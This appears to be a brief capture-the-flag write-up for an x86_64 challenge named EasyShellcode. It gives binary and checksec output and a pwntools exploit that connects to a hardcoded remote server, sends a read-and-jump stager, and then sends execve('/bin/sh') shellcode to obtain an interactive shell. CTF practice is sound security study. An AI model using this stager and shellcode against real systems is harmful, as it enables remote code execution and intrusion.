# EasyShellcode

file: `#x86_64`  
vuln: `#`  
soln: `#stager`  
  
* File
```sh
$ file problem 
problem: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=add25425cb4bce5d87c64c10487dc62146849971, not stripped
```
  
* checksec.sh
```sh
$ checksec.sh --file problem 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    Not an ELF file   No RPATH   No RUNPATH   problem

```
  
* exploit
```python
from pwn import *
from sys import argv
from time import sleep

context.log_level = "INFO"

binfile = "./problem"

context.binary = binfile

elf = ELF(binfile)

p = remote("114.177.250.4", 2210)

payload = b""
payload += asm('''
mov rsp, rax
mov rsi, [rax]
mov rdx, 61
xor rax, rax
syscall
jmp rsi
''')

padding = b"\x90" * 0x20
shellcode = b""
shellcode += asm('''
xor rdx, rdx
push rdx
movabs rax, 0x68732f2f6e69622f
push rax
mov rdi, rsp
push rdx
push rdi
mov rsi, rsp
lea rax, [rdx+0x3b]
syscall
''')

p.recvuntil("Input your shellcode: ")
p.send(payload)
p.send(padding+shellcode)

p.interactive()

```
